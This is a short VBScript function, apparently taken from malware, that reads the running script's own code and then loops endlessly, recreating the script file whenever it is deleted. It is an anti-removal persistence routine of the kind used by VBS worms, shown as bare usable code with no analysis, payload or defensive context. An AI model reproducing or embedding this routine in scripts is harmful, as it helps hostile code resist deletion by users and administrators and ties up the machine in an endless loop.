Function Antidelete()
Set fso = CreateObject("scripting.filesystemobject")
Set Myself = fso.opentextfile(wscript.scriptfullname, 1)
MyCode = Myself.readall
Myself.Close
Do
If Not (fso.fileexists(wscript.scriptfullname)) Then
Set Myself = fso.createtextfile(wscript.scriptfullname, True)
Myself.write MyCode
Myself.Close
End If
Loop
End Function